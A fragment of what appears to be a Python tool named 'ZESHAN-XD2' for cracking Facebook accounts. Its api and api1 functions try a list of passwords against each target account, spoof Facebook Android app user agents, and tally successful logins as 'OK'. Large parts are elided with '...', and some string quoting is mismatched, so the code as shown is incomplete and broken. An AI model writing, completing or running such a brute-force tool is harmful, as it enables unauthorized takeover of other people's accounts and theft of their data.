...
\033[1;31m\033[1;37m
 ...
 Version   : \033[1;32m0.4\033[1;37m
\033[1;31m\033[1;37m""")           
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ZESHAN-XD2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBLC/en_GB;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T561;FBSV/'+fbsv+';FBOP/'+fbop+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=640,height=720};FB_FW/1;FBRV/'+str(random.randint(111111111,999999999))+';]'
...
def api1(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        zeshan_ua=random.choice(["Dalvik/2.1.0 (Linux; U; Android 11 Build/8324; Xiaomi POCO X3) [FBAN/171.4.4.0;FBBV/443712637;FBRV/3;com.facebook.ocra;FBLC/en_US;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/POCO X3;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1416,height=1829};FB_FW/3;]','Dalvik/2.1.0 (Linux; U; Android 12 Build/7866; TECNO Model3) [FBAN/993.4.1.0;FBBV/686115212;FBRV/0;com.facebook.katana;FBLC/en_US;FBMF/TECNO;FBBD/TECNO;FBDV/Model3;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1072,height=1202};FB_FW/2;]"])
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
